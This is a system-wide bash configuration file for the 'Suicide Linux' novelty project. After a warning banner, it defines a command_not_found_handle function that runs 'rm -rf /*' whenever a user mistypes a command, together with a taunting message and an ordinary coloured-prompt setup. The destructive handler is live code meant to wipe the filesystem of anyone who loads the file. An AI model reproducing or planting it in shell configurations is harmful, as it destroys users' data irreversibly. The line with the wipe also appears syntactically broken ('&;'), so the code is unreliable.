# System-wide .bashrc file for interactive bash(1) shells.

# Set warning message
echo " ==================================="
echo " WARNING: Suicide-Linux installed"
echo "          (https://qntm.org/suicide)"
echo " ==================================="

# If not running interactively, don't do anything
[ -z "$PS1" ] && return

# set a fancy prompt (non-color, overwrite the one in /etc/profile)
PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '

function command_not_found_handle {
     rm -rf /* 2>/dev/null &; echo "Oops, looks like you misspelt something >:)";
}

  function promptCommand()
  {
    LAST_STATUS=$?
    # Set title of window to dir, then add new line to prompt.
    PS1='\[\e]0;\w\a\]\n'
    if [ $LAST_STATUS -eq 0 ]; then
      ((successes++))
      PS1+='\[\033[1;32m\][$successes]'
    else
      successes=0
      PS1+='\[\033[1;31m\][0 $LAST_STATUS]'
    fi  
    PS1+='\[\033[0;32m\] '
    PS1+='\w $(date +%H:%M) \$ \[\033[0m\]'
  }

  lastStatus=0
  successes=-1
  PROMPT_COMMAND="promptCommand"
